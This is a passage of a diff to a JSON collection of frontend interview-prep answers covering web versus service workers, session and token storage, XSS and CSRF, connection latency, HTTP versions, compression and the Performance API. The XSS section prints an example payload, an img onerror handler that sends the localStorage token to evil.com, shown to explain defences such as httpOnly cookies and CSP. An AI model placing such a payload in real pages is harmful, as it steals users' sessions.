\"id\": \"who\", \"label\": \"alive right now\", \"kind\": \"slots\", \"slots\": [\"Tab A\", \"Web Worker A\", \"Tab B\", \"Service Worker\"] }\n  ],\n  \"vars\": [\"event\", \"can intercept fetch?\"],\n  \"steps\": [\n    {\n      \"note\": \"Tab A opens. It registers the service worker and spawns a web worker for parsing.\",\n      \"marks\": { \"who\": { \"Tab A\": \"active\", \"Web Worker A\": \"active\", \"Service Worker\": \"active\" } },\n      \"cells\": { \"who\": [\"open\", \"running\", \"—\", \"running\"] },\n      \"vars\": { \"event\": \"page load\", \"can intercept fetch?\": \"service worker only\" }\n    },\n    {\n      \"note\": \"Tab B opens. It gets its **own** web worker — but it is controlled by the **same** service worker. One-to-one versus one-to-many, on screen.\",\n      \"marks\": { \"who\": { \"Tab B\": \"active\", \"Service Worker\": \"hit\" } },\n      \"cells\": { \"who\": [\"open\", \"running\", \"open\", \"running — now controls both\"] },\n      \"vars\": { \"event\": \"second tab\", \"can intercept fetch?\": \"both tabs, one worker\" }\n    },\n    {\n      \"note\": \"Nothing happens for 30 seconds. The browser **stops** the idle service worker — and any module-level variable it was holding is gone.\",\n      \"marks\": { \"who\": { \"Service Worker\": \"skip\" } },\n      \"cells\": { \"who\": [\"open\", \"running\", \"open\", \"stopped (state lost)\"] },\n      \"vars\": { \"event\": \"idle\", \"can intercept fetch?\": \"yes — it wakes for one\" }\n    },\n    {\n      \"note\": \"Tab A closes. Its web worker dies with it — a dedicated worker has no life of its own.\",\n      \"marks\": { \"who\": { \"Tab A\": \"bad\", \"Web Worker A\": \"bad\" } },\n      \"cells\": { \"who\": [\"closed\", \"terminated\", \"open\", \"stopped\"] },\n      \"vars\": { \"event\": \"tab closed\", \"can intercept fetch?\": \"yes, for Tab B\" }\n    },\n    {\n      \"note\": \"Tab B closes too. A push arrives — and the service worker **wakes with no tab open at all**. That is the capability a web worker can never have.\",\n      \"marks\": { \"who\": { \"Tab B\": \"bad\", \"Service Worker\": \"hit\" } },\n      \"cells\": { \"who\": [\"closed\", \"terminated\", \"closed\", \"woken by push\"] },\n      \"vars\": { \"event\": \"push\", \"can intercept fetch?\": \"yes — no page needed\" }\n    }\n  ],\n  \"result\": \"a web worker is a thread the page owns; a service worker is a process the origin owns\"\n}\n```\n\n## Choosing, in one question\n\n**Is the main thread busy, or is the network the problem?**\n\n- Busy main thread → web worker.\n- Unreliable network, offline, caching, push → service worker.\n- Both → both. They are not alternatives, and a real PWA uses each for its own job.\n\nIf you need shared state across tabs *without* the network, there is a third answer: a `SharedWorker`, or a plain worker plus [`BroadcastChannel`](/web-fundamentals/16).\n\n## Common mistakes\n\n- **Reaching for a worker to fix paint jank.** Rendering stays on the main thread; measure before moving anything.\n- **Chatty `postMessage`.** Structured clone copies. Batch, or transfer ownership.\n- **Module-level state in a service worker.** It is stopped and restarted constantly; the variable will be gone.\n- **Assuming the worker controls the page that registered it.** It does not, until the next navigation or an explicit `clients.claim()`.\n- **One web worker per row/item.** Threads are not free — use a small pool.\n- **Expecting DOM access in either.** Neither has it. Return data; render on the main thread.\n\n## Key takeaways\n\n- Same mechanism — a thread with no DOM — for opposite problems: CPU versus network.\n- Web worker: 1:1 with its page, dies with the tab, cannot intercept anything.\n- Service worker: 1:many across the origin, outlives every tab, intercepts every request in scope.\n- A service worker is stopped whenever idle, so it must keep nothing in memory between events.\n- `event.respondWith()` is the capability that has no equivalent elsewhere on the platform.\n- They are complementary, not alternatives.\n\n## Interview follow-ups\n\n- **\"Is a service worker a web worker?\"** — It is built on the same worker primitive, but it is a network proxy with its own lifecycle, not a compute thread.\n- **\"Ten tabs open — how many of each?\"** — Ten web workers if each page spawns one, and exactly one service worker controlling all ten.\n- **\"Why did my service worker's variable disappear?\"** — It was stopped while idle and restarted for the next event. Persist to Cache Storage or IndexedDB.\n- **\"When is a web worker the wrong tool?\"** — When the bottleneck is layout or paint, or when the messages are so frequent that structured clone costs more than the work saved.\n- **\"How do you share state between tabs?\"** — `SharedWorker`, `BroadcastChannel`, or the service worker itself — not a dedicated worker, which cannot be reached by another tab."
     },
     {
@@ -176,6 +578,36 @@
         "browser"
       ],
       "source": "user request: 1-day interview prep - browser & architecture",
+      "summary": {
+        "definition": "Authentication is proving who you are; authorization is what you are then allowed to do. XSS is an attacker getting their JavaScript to run on your page. CSRF is another site making the user's own browser send an authenticated request to yours.",
+        "api": [
+          {
+            "signature": "Set-Cookie: token=…; HttpOnly; Secure; SameSite=Lax",
+            "note": "the safe home for a session — unreadable by script, and not sent cross-site"
+          },
+          {
+            "signature": "localStorage.setItem('token', jwt)",
+            "note": "readable by any script on the page, so a single XSS bug is a stolen session"
+          },
+          {
+            "signature": "Authorization: Bearer <jwt>",
+            "note": "the header you send when the token is not in a cookie"
+          },
+          {
+            "signature": "dangerouslySetInnerHTML / el.innerHTML",
+            "note": "the main XSS door; React escapes everything else for you, and this is the opt-out"
+          },
+          {
+            "signature": "href={userInput}",
+            "note": "still unsafe even in React — a `javascript:` URL executes when clicked"
+          },
+          {
+            "signature": "Content-Security-Policy",
+            "note": "defence in depth: stops injected inline script running even if something slips through"
+          }
+        ],
+        "useCase": "A comment box where someone posts `<img onerror=…>`. If your session token lives in `localStorage`, that one comment reads it and ships it to the attacker."
+      },
       "answer": "Authentication is **who you are**. Authorization is **what you're allowed to do**. Frontend interviews probe the first, and the storage decision that follows it.\n\nTo put it simply: the server hands you proof of identity, and every subsequent request has to carry that proof. Where you put it is the whole security conversation.\n\n## Two models\n\n**Session (stateful).** The server creates a session, stores it (in memory, Redis, a database), and sends you an opaque session ID in a cookie. Every request sends the cookie; the server looks it up.\n\n- Revoking is trivial — delete the session row and the user is out instantly\n- Requires server-side state, which needs sharing across instances\n\n**JWT (stateless).** The server signs a token containing claims (user id, roles, expiry). Nothing is stored server-side; the signature is what proves it wasn't tampered with.\n\n- Scales horizontally with no shared store — any instance can verify it\n- **Revoking is hard.** A valid token stays valid until it expires. If it's stolen, you cannot easily kill it\n\nA JWT is three base64 chunks: header, payload, signature. **The payload is signed, not encrypted** — anyone holding the token can decode and read it. Never put anything secret in a JWT. That's a favorite gotcha question.\n\nThe standard mitigation for the revocation problem: **short-lived access tokens** (5–15 minutes) plus a **long-lived [refresh token](/system-design/408)** stored more securely. The blast radius of a stolen access token is then minutes, not days.\n\n## Where do you store the token?\n\nThis is *the* frontend question, and the answer is a trade-off, not a rule.\n\n| | `localStorage` | `httpOnly` cookie |\n| --- | --- | --- |\n| Readable by JS | **Yes** — any XSS steals it | **No** — invisible to JS |\n| Sent automatically | No — you attach it | Yes — on every matching request |\n| Vulnerable to XSS | **Yes** | Much less |\n| Vulnerable to CSRF | No | **Yes** — needs `SameSite`/tokens |\n| Cross-domain API | Easy | Needs [CORS](/browser/156) credentials setup |\n\n**The strongest general answer:**\n\n> \"I'd use an `httpOnly`, `Secure`, `SameSite=Lax` cookie for the refresh token, and keep the access token in memory only — a JS variable, not `localStorage`. Memory dies on refresh, so on load I silently exchange the refresh cookie for a fresh access token.\n>\n> That means an XSS can't read the refresh token at all, and the access token isn't sitting in persistent storage where a single injected script can scrape it. The cost is CSRF exposure on the refresh endpoint, which `SameSite` plus a CSRF token handles.\"\n\nThat answer demonstrates you understand there's no free option — you're choosing which attack to defend against and mitigating the other.\n\n**Why `localStorage` is genuinely risky:** it is readable by *any* JavaScript running on the page. That includes every npm dependency and every third-party script. One compromised package and every token is exfiltrated. `httpOnly` cookies survive that scenario because JS simply cannot see them.\n\n## XSS — Cross-Site Scripting\n\n**Attacker gets their JavaScript running on your page.** Then they have everything the user has.\n\n```javascript\n// Attacker submits this as their display name:\n<img src=x onerror=\"fetch('https://evil.com?t='+localStorage.token)\">\n```\n\n**React protects you by default** — it escapes all interpolated values, so `{userInput}` renders as text, never as markup. The ways you lose that protection:\n\n- **`dangerouslySetInnerHTML`** — the name is a deliberate warning. Sanitize with DOMPurify first.\n- **`href={userInput}`** — a `javascript:` URL executes on click. Validate the protocol.\n- **Rendering into the DOM manually** via a ref and `innerHTML`.\n- **`eval`** or `new Function` on anything user-derived.\n\nThe defense in depth is **[Content Security Policy](/system-design/407)** — a header restricting which script sources may execute:\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'self'\n```\n\nWith a strict CSP, even a successful injection often can't run, because inline scripts are blocked.\n\n## CSRF — Cross-Site Request Forgery\n\n**The attacker doesn't steal your cookie — they get the browser to send it.** A hidden form on `evil.com` POSTs to `yourbank.com/transfer`, and the browser helpfully attaches your cookies because that's what cookies do.\n\nNote this only works against *automatic* credentials. It's a cookie problem specifically — a token you attach manually in an `Authorization` header isn't sent by a forged cross-site request.\n\nDefenses:\n\n- **`SameSite=Lax`** (the modern browser default) — cookies aren't sent on cross-site POSTs. This alone kills most CSRF.\n- **`SameSite=Strict`** — not sent on any cross-site request, including following a link *into* your site. More secure, worse UX.\n- **CSRF tokens** — a per-session random value the server requires in the body or a header. `evil.com` can't read it (same-origin policy), so it can't forge a valid request.\n\n**The clean one-liner:** *XSS steals the credential; CSRF abuses it in place. `httpOnly` stops the theft, `SameSite` stops the abuse.*\n\n## The other things worth a sentence\n\n- **`Secure`** flag — cookie only over HTTPS.\n- **Clickjacking** — your site in an invisible iframe over a decoy. Fixed with `X-Frame-Options: DENY` or CSP `frame-ancestors`.\n- **Open redirect** — `?next=` pointing off-site. Validate redirect targets against an allowlist.\n- **Never trust the client.** Hiding an admin button is UX, not security. Every check must be re-done server-side. If they ask one authorization question, it's usually this.\n- **Secrets in the bundle** — anything in a frontend env var ships to the user. `VITE_`-prefixed variables are *public*. Only a backend may hold an API secret.\n\n## OAuth in one paragraph\n\nYou don't hand your password to a third party. You're redirected to the provider, you authorize, and they redirect back with a short-lived **code**, which your server exchanges for a token using its own secret. The code-plus-secret exchange is what stops an intercepted redirect from being useful. For public clients that can't hold a secret — SPAs and mobile apps — the modern requirement is **PKCE**, which substitutes a per-request generated verifier for the static secret. *OAuth is authorization; **OIDC** is the identity layer built on top that actually tells you who the user is.*\n\n## Follow-ups\n\n**\"How do you handle token expiry gracefully?\"** — An interceptor: on a `401`, pause the failing request, refresh the token once, retry. Queue any concurrent requests so a burst of 401s doesn't trigger five parallel refreshes — that's the detail that shows you've built it.\n\n**\"How do you log someone out everywhere?\"** — Easy with sessions. With JWTs you need a revocation list or short expiry plus refresh-token invalidation — which is exactly the trade-off you accepted by going stateless.\n\n**\"Is `localStorage` ever acceptable?\"** — For a low-stakes internal tool, honestly yes, and pretending otherwise is dogma. But say what you're accepting: any XSS is a full account compromise."
     },
     {
@@ -188,6 +620,28 @@
         "performance"
       ],
       "source": "user request: senior frontend networking — CDN, HTTP protocols, edge",
+      "summary": {
+        "definition": "Before any of your HTML arrives, the browser has to find the server (DNS), open a connection (TCP), agree on encryption (TLS) and wait for the first byte back (TTFB). These are round trips, so they cost latency, not bandwidth — a fatter pipe barely helps.",
+        "api": [
+          {
+            "signature": "<link rel=\"dns-prefetch\" href=\"//api.example.com\">",
+            "note": "resolve the hostname early; the cheapest hint and the one that helps least"
+          },
+          {
+            "signature": "<link rel=\"preconnect\" href=\"https://api.example.com\">",
+            "note": "do DNS + TCP + TLS now, so the real request starts on a warm connection"
+          },
+          {
+            "signature": "connection reuse (keep-alive)",
+            "note": "the second request to the same origin skips all three setup round trips"
+          },
+          {
+            "signature": "TLS 1.3",
+            "note": "one round trip for the handshake instead of the two TLS 1.2 needs"
+          }
+        ],
+        "useCase": "A page pulling from your domain, a font host, an analytics host and an image CDN pays DNS + TCP + TLS four separate times — roughly 600 ms on mobile, before a single byte of content."
+      },
       "answer": "Before a single byte of your HTML arrives, four things have to happen. On a fast connection they cost 50 ms; on mobile in a different continent they cost 600 ms, and no amount of bundle optimisation touches them.\n\n![The life of a request](/diagrams/browser/request-life.svg)\n\n## The phases\n\n| Phase | What happens | Typical cost |\n| --- | --- | --- |\n| **DNS** | Hostname → IP, via the OS cache, the resolver, then the authoritative server | 0–120 ms (0 if cached) |\n| **TCP** | Three-way handshake: SYN, SYN-ACK, ACK | 1 round trip |\n| **TLS** | Certificate, cipher agreement, keys | 1 RTT (TLS 1.3) or 2 (TLS 1.2) |\n| **Request** | Your bytes go out | ½ RTT |\n| **TTFB** | Server thinks, first byte comes back | Server time + ½ RTT |\n| **Download** | The rest, at whatever the congestion window allows | Size ÷ bandwidth, plus slow start |\n\nA round trip to a server on another continent is 150–250 ms. **DNS + TCP + TLS is three of them before the request is even sent** — which is why a single `preconnect` to the right origin can be worth more than a week of [code splitting](/system-design/403).\n\n## Step through it\n\n```trace\n{\n  \"input\": \"First request to https://api.example.com from a phone, 180 ms round trip, cold cache\",\n  \"lanes\": [\n    { \"id\": \"phase\", \"label\": \"Connection phase\", \"kind\": \"phases\", \"of\": [\"DNS\", \"TCP\", \"TLS\", \"request\", \"TTFB\", \"download\"] },\n    { \"id\": \"log\", \"label\": \"On the wire\", \"kind\": \"log\" }\n  ],\n  \"vars\": [\"elapsed\", \"bytes received\"],\n  \"steps\": [\n    {\n      \"note\": \"Resolve `api.example.com`. Nothing is cached, so the resolver has to ask upstream.\",\n      \"cells\": { \"log\": [\"DNS query → 93.184.216.34\"] },\n      \"marks\": { \"phase\": { \"DNS\": \"active\" } },\n      \"vars\": { \"elapsed\": \"120 ms\", \"bytes received\": \"0\" }\n    },\n    {\n      \"note\": \"TCP three-way handshake. One full round trip, and nothing useful is transferred in it.\",\n      \"cells\": { \"log\": [\"DNS query → 93.184.216.34\", \"SYN → SYN-ACK → ACK\"] },\n      \"marks\": { \"phase\": { \"DNS\": \"done\", \"TCP\": \"active\" } },\n      \"vars\": { \"elapsed\": \"300 ms\", \"bytes received\": \"0\" }\n    },\n    {\n      \"note\": \"TLS 1.3 handshake — one more round trip for the certificate and keys. TLS 1.2 would cost two.\",\n      \"cells\": { \"log\": [\"SYN → SYN-ACK → ACK\", \"ClientHello → cert → keys\"] },\n      \"marks\": { \"phase\": { \"DNS\": \"done\", \"TCP\": \"done\", \"TLS\": \"active\" } },\n      \"vars\": { \"elapsed\": \"480 ms\", \"bytes received\": \"0\" }\n    },\n    {\n      \"note\": \"Only now does the actual request leave. Half a round trip out, and the server starts working.\",\n      \"cells\": { \"log\": [\"ClientHello → cert → keys\", \"GET /feed HTTP/2\"] },\n      \"marks\": { \"phase\": { \"TLS\": \"done\", \"request\": \"active\" } },\n      \"vars\": { \"elapsed\": \"570 ms\", \"bytes received\": \"0\" }\n    },\n    {\n      \"note\": \"First byte. TTFB is server think-time plus the return trip — the only part of this that your backend controls.\",\n      \"cells\": { \"log\": [\"GET /feed HTTP/2\", \"200 OK — first byte\"] },\n      \"marks\": { \"phase\": { \"request\": \"done\", \"TTFB\": \"hit\" } },\n      \"vars\": { \"elapsed\": \"700 ms\", \"bytes received\": \"1 KB\" }\n    },\n    {\n      \"note\": \"The body streams in. Slow start means the first few round trips move less than the link could carry.\",\n      \"cells\": { \"log\": [\"200 OK — first byte\", \"…44 KB body\"] },\n      \"marks\": { \"phase\": { \"TTFB\": \"done\", \"download\": \"active\" } },\n      \"vars\": { \"elapsed\": \"900 ms\", \"bytes received\": \"45 KB\" }\n    },\n    {\n      \"note\": \"The second request to this origin skips DNS, TCP and TLS entirely — the connection is reused. That is the whole argument for `preconnect` and for fewer origins.\",\n      \"cells\": { \"log\": [\"connection reused\", \"GET /me — first byte at +190 ms\"] },\n      \"marks\": { \"phase\": { \"DNS\": \"skip\", \"TCP\": \"skip\", \"TLS\": \"skip\", \"request\": \"done\", \"TTFB\": \"hit\", \"download\": \"done\" } },\n      \"vars\": { \"elapsed\": \"+190 ms\", \"bytes received\": \"2 KB\" }\n    }\n  ]\n}\n```\n\n## What each phase responds to\n\n- **DNS** — fewer origins; `preconnect`/`dns-prefetch` for the ones you keep; a sane TTL on your own records.\n- **TCP + TLS** — connection reuse (one origin, kept alive), TLS 1.3, and a CDN that terminates the handshake at a nearby PoP instead of at your origin. See [CDN and the edge](/system-design/115).\n- **TTFB** — server work, cache hits, and physical distance. Static HTML from an edge cache has a TTFB of a few milliseconds.\n- **Download** — compression ([entry 162](/browser/162)), size, and slow start, which is why the first 14 kB of a response is disproportionately valuable.\n\n## The origins tax\n\nEvery extra origin is a fresh DNS + TCP + TLS. A page pulling from your domain, a font host, an analytics host, an image CDN and a tag manager pays that four times over — and browser cache partitioning means a \"shared\" CDN copy of a library is no longer shared across sites. Fewer origins, self-hosted fonts, and `preconnect` for what remains.\n\n## Key takeaways\n\n- Three round trips of setup before the request goes out; on mobile that is most of your TTFB.\n- Reused connections skip all of it — origin count is a performance decision.\n- TTFB is server time plus distance; the CDN attacks the distance half.\n- `preconnect` early for third-party origins you know you will use.\n\n## Interview follow-ups\n\n- **\"Your TTFB is 800 ms. Where do you look?\"** — Split it: DNS, connect, TLS, server. A waterfall entry shows each. Distance and cold connections look different from a slow database.\n- **\"Why does the second request feel instant?\"** — Connection reuse: DNS, TCP and TLS are already paid for.\n- **\"Would you shard across domains for parallelism?\"** — No. That was an HTTP/1.1 workaround; with [HTTP/2](/browser/161) multiplexing it costs handshakes and buys nothing."
     },
     {
@@ -200,6 +654,28 @@
         "performance"
       ],
       "source": "user request: senior frontend networking — CDN, HTTP protocols, edge",
+      "summary": {
+        "definition": "Each HTTP version removed a queue. HTTP/1.1 sends one request at a time per connection. HTTP/2 multiplexes many requests over a single connection. HTTP/3 moves that connection onto UDP, so one lost packet no longer stalls everything else.",
+        "api": [
+          {
+            "signature": "domain sharding — static1., static2.",
+            "note": "the HTTP/1.1 parallelism trick; under HTTP/2 it only buys you extra handshakes"
+          },
+          {
+            "signature": "concatenating all JS into one bundle",
+            "note": "required under HTTP/1.1, harmful after it — one changed byte invalidates the whole cached file"
+          },
+          {
+            "signature": "103 Early Hints + <link rel=\"preload\">",
+            "note": "the replacement for HTTP/2 Server Push, which browsers removed"
+          },
+          {
+            "signature": "Alt-Svc: h3=\":443\"",
+            "note": "how a server advertises HTTP/3; the first request still goes over HTTP/2, then upgrades"
+          }
+        ],
+        "useCase": "A build still splitting assets across `static1.` and `static2.` on an HTTP/2 server — it is paying for two extra TLS handshakes to work around a limit that no longer exists."
+      },
       "answer": "Each version fixed the head-of-line blocking left by the one before, one layer further down the stack. That single sentence is the whole story; the details are how it was done and what it means for your build.\n\n![HTTP/1.1, HTTP/2 and HTTP/3](/diagrams/browser/http-versions.svg)\n\n## HTTP/1.1 — one request at a time per connection\n\nA connection carries one request/response at a time. A slow response blocks everything behind it on that connection — **head-of-line blocking at the HTTP layer**. Browsers worked around it by opening ~6 connections per origin, and developers worked around *that* with:\n\n- **Domain sharding** — split assets over `static1.`, `static2.` for more parallel connections.\n- **Concatenation** — one big JS file and one big CSS file, because each request was expensive.\n- **Sprites and inlined data URIs** — same reason, for images.\n\nAll three are now anti-patterns, and this is why: they were compensating for a limit that no longer exists.\n\n## HTTP/2 — multiplexing over one connection\n\nOne TCP connection, many concurrent **streams**, interleaved. Also: header compression (HPACK — repeated cookies and user-agent stop costing a kilobyte per request) and stream priorities.\n\n```\nHTTP/1.1   [--- app.js ---][--- style.css ---][--- logo.svg ---]   sequential\nHTTP/2     [app.js ][style ][logo][app.js ][style ][logo]          interleaved\n```\n\nBut TCP still delivers bytes in order. **Lose one packet and every stream on that connection stalls** until it is retransmitted — head-of-line blocking moved from HTTP down to TCP. On a clean network HTTP/2 is a large win; on a lossy mobile network it can be worse than several HTTP/1.1 connections.\n\nServer push shipped with HTTP/2 and has been removed from browsers: it pushed resources the client already had. `103 Early Hints` with `preload` is the replacement that actually works.\n\n## HTTP/3 — QUIC, over UDP\n\nHTTP/3 drops TCP and runs on QUIC over UDP, with streams that are genuinely independent: a lost packet stalls only its own stream. Also:\n\n- **Handshake in 1 RTT** (0-RTT on resumption) because transport and TLS 1.3 are negotiated together.\n- **Connection migration**: a connection id survives changing networks, so switching from Wi-Fi to cellular does not drop your uploads.\n\nDiscovery is via the `Alt-Svc` header or DNS HTTPS records — the first request usually goes over HTTP/2 and the browser upgrades afterwards.\n\n## What changes in your build\n\n| Practice | HTTP/1.1 | HTTP/2 and up |\n| --- | --- | --- |\n| Concatenate everything | Required | **Harmful** — one byte changed invalidates the whole file |\n| Domain sharding | Helped | **Harmful** — extra handshakes, no benefit |\n| Many small files | Expensive | Fine, within reason |\n| Inline small assets | Common | Only for genuinely tiny, critical things |\n| Fewer origins | Helped | Still helps — for connection reuse |\n\n\"Many small files are free now\" is overstated. Each chunk still costs a request, its own compression floor (small files compress worse) and its own execution overhead, and a deep import graph can still waterfall. Chunk by change frequency, not by count — see [Build and deploy topology](/system-design/109).\n\n## Key takeaways\n\n- 1.1 blocks at the HTTP layer, 2 fixes that but blocks at TCP, 3 fixes that with QUIC over UDP.\n- HTTP/2 gives multiplexing and header compression on one connection.\n- HTTP/3 wins most on lossy mobile networks, and survives a network change.\n- Concatenation and sharding are 1.1-era workarounds; keeping them costs you today.\n\n## Interview follow-ups\n\n- **\"What is head-of-line blocking?\"** — One waiting item blocking those behind it. In 1.1 it is the request queue; in 2 it is TCP's in-order delivery; QUIC removes it per stream.\n- **\"Is HTTP/2 always faster?\"** — No. On a high-loss link, one TCP connection means one lost packet stalls every stream, and several 1.1 connections can beat it. That is what HTTP/3 addresses.\n- **\"How many chunks should you ship?\"** — Enough to isolate change frequency, not so many that per-request overhead and worse compression eat the win. Measure, do not assume."
     },
     {
@@ -212,6 +688,32 @@
         "performance"
       ],
       "source": "user request: senior frontend networking — CDN, HTTP protocols, edge",
+      "summary": {
+        "definition": "Compression is the server shrinking a text file before sending it and the browser expanding it on arrival. It is one of the few optimisations with no design trade-off — the bytes just get smaller — provided it is actually switched on for the right files.",
+        "api": [
+          {
+            "signature": "Accept-Encoding: gzip, br",
+            "note": "the browser listing what it can decompress; it sends this on every request"
+          },
+          {
+            "signature": "Content-Encoding: br",
+            "note": "the server's answer, saying which one it used"
+          },
+          {
+            "signature": "Vary: Accept-Encoding",
+            "note": "required, or a cache serves the brotli copy to a client that cannot read it"
+          },
+          {
+            "signature": "app.js.br (precompressed at build time)",
+            "note": "static compression: compress once at the highest level, rather than per request"
+          },
+          {
+            "signature": "curl -I <url>",
+            "note": "how you check it is on at all — look for `Content-Encoding` in the response"
+          }
+        ],
+        "useCase": "A 300 kB JavaScript bundle arriving as 70 kB, because brotli was enabled — and the JPEGs next to it staying untouched, since they are already compressed."
+      },
       "answer": "Free bytes, and one of the few optimisations with no design trade-off — but only if it is actually switched on for the right things, which it often is not.\n\n## How it is negotiated\n\n```http\nRequest:   Accept-Encoding: gzip, deflate, br, zstd\nResponse:  Content-Encoding: br\n           Vary: Accept-Encoding\n```\n\nThe client lists what it understands; the server picks one and says which. **`Vary: Accept-Encoding` is mandatory** — without it a shared cache can hand a brotli response to a client that asked for gzip.\n\n| Codec | Typical text saving | Notes |\n| --- | --- | --- |\n| **gzip** | ~70% | Universal, fast, the floor |\n| **brotli** (`br`) | ~15–20% better than gzip | Universal in practice; slow at max quality, so precompress |\n| **zstd** | Comparable to brotli, much faster | Growing support; nice for dynamic responses |\n\n## Static vs dynamic compression\n\n- **Static (precompressed).** Compress at build time at maximum quality, ship `app.js.br` next to `app.js`, let the server pick. Best ratio, zero request-time CPU. This is what you want for your bundles.\n- **Dynamic (on the fly).** For API responses and server-rendered HTML. Use a middling quality level — brotli quality 11 on a per-request basis costs more CPU than the bytes are worth; 4–5 is the usual sweet spot.\n\n```bash\n# In CI, next to the build output.\nbrotli -q 11 -k dist/assets/*.js dist/assets/*.css\ngzip  -9  -k dist/assets/*.js dist/assets/*.css   # fallback\n```\n\n## What not to compress\n\n**Already-compressed formats.** JPEG, PNG, WebP, AVIF, MP4, WOFF2, ZIP. Recompressing gains a fraction of a percent and costs CPU on both ends — and can make the file *larger*. WOFF2 is brotli internally; compressing it again is pure waste.\n\n**Very small responses.** Below roughly 1 kB the framing overhead can exceed the saving. Most servers have a `gzip_min_length` for exactly this.\n\n**Anything where compression leaks information.** Compressing a response that mixes a secret with attacker-controlled text is the BREACH class of attack; the practical mitigations are [CSRF](/browser/158) tokens that change per request and not reflecting user input next to secrets.\n\n## Where it happens\n\nUsually at the [CDN](/system-design/115) or the reverse proxy, not in your application server — the edge is closer to the user, has the CPU, and can serve a precompressed variant from cache. Which means: check it at the edge. A perfectly configured nginx behind a CDN that strips `Accept-Encoding` ships uncompressed bytes.\n\n```bash\ncurl -sI -H 'Accept-Encoding: br' https://example.com/assets/app.js | grep -i 'content-encoding\\|vary'\n```\n\nThat one-liner is worth running against production more often than people do.\n\n## Key takeaways\n\n- Brotli for text, precompressed at build time; gzip as the fallback.\n- `Vary: Accept-Encoding` or shared caches will serve the wrong body.\n- Never recompress images, video or WOFF2.\n- Verify at the edge with `curl -I`; it is switched off more often than anyone expects.\n\n## Interview follow-ups\n\n- **\"gzip or brotli?\"** — Brotli where supported, precompressed at max quality for static assets; a lower quality for dynamic responses because the CPU is per request.\n- **\"Why not compress images?\"** — They already are. You gain nothing and can grow the payload.\n- **\"How would you check compression is on?\"** — `curl -I` with an `Accept-Encoding` header against production, and check `Content-Encoding` and `Vary` come back."
     },
     {
@@ -224,6 +726,36 @@
         "Web API"
       ],
       "source": "user paste: speed tests, performance.now() and the Performance API",
+      "summary": {
+        "definition": "The Performance API is the browser's own stopwatch and record of what the page did. It gives you a clock that never jumps and a stream of entries — how long the page took to load, how long each asset took, how long your own code ran.",
+        "api": [
+          {
+            "signature": "performance.now()",
+            "note": "milliseconds since the page started, monotonic — use this for durations"
+          },
+          {
+            "signature": "Date.now()",
+            "note": "wall-clock time, which can jump backwards — how a duration comes back negative in production"
+          },
+          {
+            "signature": "performance.mark(name) / performance.measure(name, a, b)",
+            "note": "name your own spans, and they show up in DevTools alongside the browser's"
+          },
+          {
+            "signature": "new PerformanceObserver(cb).observe({ type, buffered: true })",
+            "note": "the only correct way to collect — `buffered: true` replays entries that fired before you were listening"
+          },
+          {
+            "signature": "entry.transferSize === 0",
+            "note": "on a resource entry, that means it came from cache"
+          },
+          {
+            "signature": "Timing-Allow-Origin",
+            "note": "without it, a cross-origin asset's phase timings all come back as zero"
+          }
+        ],
+        "useCase": "Measuring how long your own reducer takes on a real user's phone, and finding that the 12 ms you measured locally is 180 ms on mid-range Android."
+      },
       "answer": "Every timing number you will ever report — a TTFB, a frame budget, how long a fetch took, how long your own reducer ran — comes from one of two clocks. Picking the wrong one is how a duration comes back negative in production and nobody can reproduce it.\n\n## The two clocks\n\n![The Performance API timeline](/diagrams/browser/performance-api.svg)\n\n`Date.now()` answers *\"what time is it?\"*. It reads the system wall clock, counted in whole milliseconds since the Unix epoch. That clock belongs to the operating system, and the operating system moves it: NTP resyncs nudge it, a user changes it, a laptop waking from sleep corrects a drift of several seconds. It can jump **backwards**.\n\n`performance.now()` answers *\"how long since this page started?\"*. It returns a fractional number of milliseconds since `performance.timeOrigin` — roughly the moment the document began loading — from a monotonic clock that only ever increases. Nothing can move it backwards.\n\n| | `Date.now()` | `performance.now()` |\n| --- | --- | --- |\n| Zero point | 1 Jan 1970 UTC | `performance.timeOrigin` (this document) |\n| Resolution | whole milliseconds | fractional — microseconds, then rounded |\n| Monotonic | **no** — resyncs and manual changes move it | **yes** — strictly forward |\n| Comparable across tabs | yes (same epoch) | only via `timeOrigin + now()` |\n| Use it for | dates, timestamps you persist or send | durations, profiling, animation, [throttling](/coding/14) |\n\nThe rule that falls out: **anything you store or transmit gets `Date.now()`; anything you subtract gets `performance.now()`.**\n\n## The failure this prevents\n\n```trace\n{\n  \"input\": \"measure a ~800ms task while NTP corrects the system clock\",\n  \"lanes\": [\n    { \"id\": \"clocks\", \"label\": \"what each clock reads\", \"kind\": \"slots\", \"slots\": [\"Date.now()\", \"performance.now()\"] }\n  ],\n  \"vars\": [\"elapsed\"],\n  \"steps\": [\n    {\n      \"note\": \"Both clocks are read at the start of the task.\",\n      \"marks\": { \"clocks\": { \"Date.now()\": \"active\", \"performance.now()\": \"active\" } },\n      \"cells\": { \"clocks\": [\"1710000000000\", \"1204.32\"] },\n      \"vars\": { \"elapsed\": \"—\" }\n    },\n    {\n      \"note\": \"`doHeavyWork()` runs for about 800ms. Both clocks advance together — so far the two approaches agree.\",\n      \"cells\": { \"clocks\": [\"1710000000800\", \"2004.90\"] },\n      \"vars\": { \"elapsed\": \"—\" }\n    },\n    {\n      \"note\": \"NTP resyncs and corrects the system clock **2 seconds backwards**. `Date.now()` time-travels; the monotonic clock does not notice.\",\n      \"marks\": { \"clocks\": { \"Date.now()\": \"bad\", \"performance.now()\": \"hit\" } },\n      \"cells\": { \"clocks\": [\"1709999998800\", \"2004.90\"] },\n      \"vars\": { \"elapsed\": \"—\" }\n    },\n    {\n      \"note\": \"Read both again and subtract. `Date.now()` reports a **negative** duration for work that definitely took time.\",\n      \"marks\": { \"clocks\": { \"Date.now()\": \"bad\" } },\n      \"cells\": { \"clocks\": [\"1709999998805\", \"2005.03\"] },\n      \"vars\": { \"elapsed\": \"Date.now(): −1195ms\" }\n    },\n    {\n      \"note\": \"The monotonic clock gives the real answer, and it is sub-millisecond precise.\",\n      \"marks\": { \"clocks\": { \"performance.now()\": \"hit\" } },\n      \"cells\": { \"clocks\": [\"1709999998805\", \"2005.03\"] },\n      \"vars\": { \"elapsed\": \"performance.now(): 800.71ms\" }\n    }\n  ],\n  \"result\": \"same code, same work — only the monotonic clock survives a clock correction\"\n}\n```\n\nA negative duration is the loud version. The quiet version is a metric dashboard where p99 latency has a spike nobody can explain, because a fraction of users resynced their clock mid-measurement.\n\n```javascript\nconst start = performance.now();\ndoHeavyWork();\nconst duration = performance.now() - start;\nconsole.log(`took ${duration.toFixed(3)} ms`);\n```\n\n## Why the precision is deliberately blunted\n\n`performance.now()` *can* resolve to microseconds, and for a while it did. 